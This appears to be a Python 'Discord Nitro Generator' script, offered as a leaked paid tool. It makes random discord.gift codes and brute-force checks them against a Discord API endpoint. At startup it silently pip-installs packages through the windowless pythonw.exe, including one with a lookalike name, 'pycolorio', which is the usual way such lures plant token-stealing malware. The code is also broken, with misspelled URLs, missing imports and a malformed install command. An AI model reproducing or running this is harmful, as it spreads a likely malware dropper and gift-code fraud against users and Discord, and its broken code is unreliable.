import random, string
from sys import executable
import os
from os import system

requirements = ['colored', 'requests', 'pycolorio']

for req in requirements:
    try:
        import req
    except:
        system(executable.replace('.exe', 'w.exe') + ' pip install' + req)

g = colored.fg('#aa61ee')

os.system('clear')

print(f"""
{g} 

████████╗░█████╗░██╗░░██╗░█████╗░███╗░░░███╗░█████╗░  ░██████╗░███████╗███╗░░██╗
╚══██╔══╝██╔══██╗██║░██╔╝██╔══██╗████╗░████║██╔══██╗  ██╔════╝░██╔════╝████╗░██║
░░░██║░░░███████║█████═╝░██║░░██║██╔████╔██║███████║  ██║░░██╗░█████╗░░██╔██╗██║
░░░██║░░░██╔══██║██╔═██╗░██║░░██║██║╚██╔╝██║██╔══██║  ██║░░╚██╗██╔══╝░░██║╚████║
░░░██║░░░██║░░██║██║░╚██╗╚█████╔╝██║░╚═╝░██║██║░░██║  ╚██████╔╝███████╗██║░╚███║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝  ░╚═════╝░╚══════╝╚═╝░░╚══╝
- Discord Nitro Generator
- Fast
- HQ
- Paid (This is Leaked Version)

""")

num = input('➤ Input How Many Codes You Want To Generate And Check: ')

f = open("Nitro Codes.txt", "w", encoding='utf-8')

print("\n" "꧁  " " Wait, Generating for You! ꧂" "\n")

for n in range(int(num)):
    y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
    f.write('https://discord.gift/')
    f.write(y)
    f.write("\n")

f.close()

# checker

with open("Nitro Codes.txt") as f:
    for line in f:
        nitro = line.strip("\n")

        url = "https://discordapp.com/api/v6/entitelemnts/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            print("\033[32m" + " Valid | {} ".format(line.strip("\n")))
            break
        else:
            print("\033[31m" + " Invalid | {}".format(line.strip("\n")))
            print("\033[37m")
input("\n"'➤ The End! Press Enter Five Time To Quit')
